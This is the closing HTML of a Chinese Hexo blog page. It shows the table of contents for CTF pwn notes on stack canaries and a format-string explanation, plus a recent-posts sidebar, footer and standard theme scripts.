href="#2-%E4%BD%A0%E7%9A%84%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">10.0.2.</span> <span class="toc-text">2. 你的代码中的情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%B8%BA%E4%BB%80%E4%B9%88-%E2%80%8Brecvuntil-b-g-%E2%80%8B-%E2%80%8B-%E8%83%BD%E5%B7%A5%E4%BD%9C%EF%BC%9F"><span class="toc-number">10.0.3.</span> <span class="toc-text">3. 为什么 ​recvuntil(b&#39;g&#39;)​ ​ 能工作？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%85%B3%E9%94%AE%E7%BB%93%E8%AE%BA"><span class="toc-number">10.0.4.</span> <span class="toc-text">4. 关键结论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95"><span class="toc-number">10.0.5.</span> <span class="toc-text">5. 验证方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">10.0.6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%92%8C%E6%A0%88%E5%8F%98%E9%87%8F%E8%AF%B4%E6%98%8E"><span class="toc-number">10.0.7.</span> <span class="toc-text">🧠 全局变量和栈变量说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%92-%E6%A0%88%E4%BF%9D%E6%8A%A4%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">10.0.8.</span> <span class="toc-text">🔒 栈保护初始化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%90-%E7%94%9F%E6%88%90%E5%88%9D%E5%A7%8B-canary-%E5%80%BC"><span class="toc-number">10.0.9.</span> <span class="toc-text">🔐 生成初始 canary 值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%AA-%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E7%8E%AF%E8%8A%82"><span class="toc-number">10.0.10.</span> <span class="toc-text">🧪 输入密码环节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%97%9D%EF%B8%8F-%E7%AC%AC%E4%BA%8C%E9%81%93%E9%94%81%EF%BC%9Acage-in-cage"><span class="toc-number">10.0.11.</span> <span class="toc-text">🗝️ 第二道锁：cage in cage</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%90-Canary-%E6%9C%BA%E5%88%B6"><span class="toc-number">10.0.11.1.</span> <span class="toc-text">🔐 Canary 机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%93%A6-Cage-%E6%A3%80%E6%9F%A5"><span class="toc-number">10.0.11.2.</span> <span class="toc-text">📦 Cage 检查</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A5-%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%87%BA%E7%8E%B0"><span class="toc-number">10.0.12.</span> <span class="toc-text">💥 漏洞点出现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E6%80%BB%E7%BB%93"><span class="toc-number">10.0.13.</span> <span class="toc-text">📌 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9B%A0%EF%B8%8F-%E4%BD%A0%E5%8F%AF%E4%BB%A5%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%9A"><span class="toc-number">10.0.14.</span> <span class="toc-text">🛠️ 你可以做什么：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9ALoginSystem%E2%80%8B"><span class="toc-number">11.</span> <span class="toc-text">题目：LoginSystem​</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%B2%E8%A7%A3%EF%BC%9Aprintf-Hello-8-n-%E2%80%8B"><span class="toc-number">11.1.</span> <span class="toc-text">讲解：printf(&quot;Hello%8$n&quot;)​</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E8%A7%A3%E9%87%8A"><span class="toc-number">11.1.1.</span> <span class="toc-text">1. 基本解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E6%A0%B7%E5%86%99%E6%98%AF%E5%8D%B1%E9%99%A9%E7%9A%84%EF%BC%9F"><span class="toc-number">11.1.2.</span> <span class="toc-text">2. 为什么这样写是危险的？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E7%BC%BA%E5%B0%91%E5%8F%82%E6%95%B0"><span class="toc-number">11.1.2.1.</span> <span class="toc-text">（1）缺少参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E5%B4%A9%E6%BA%83%E6%88%96%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E5%86%99%E5%85%A5"><span class="toc-number">11.1.2.2.</span> <span class="toc-text">（2）可能导致崩溃或任意内存写入</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/04/19/1/" title="无标题"><img src="/img/OIO.jpg" onerror="this.onerror=null;this.src='/img/loading.jpg'" alt="无标题"/></a><div class="content"><a class="title" href="/2025/04/19/1/" title="无标题">无标题</a><time datetime="2025-04-19T13:55:47.716Z" title="发表于 2025-04-19 21:55:47">2025-04-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/10/MoeCTF2024%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="MoeCTF2024做题笔记"><img src="/img/OIO.jpg" onerror="this.onerror=null;this.src='/img/loading.jpg'" alt="MoeCTF2024做题笔记"/></a><div class="content"><a class="title" href="/2025/03/10/MoeCTF2024%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="MoeCTF2024做题笔记">MoeCTF2024做题笔记</a><time datetime="2025-03-09T16:00:00.000Z" title="发表于 2025-03-10 00:00:00">2025-03-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2025/4/19 - 2025 By Icyice</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="120" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
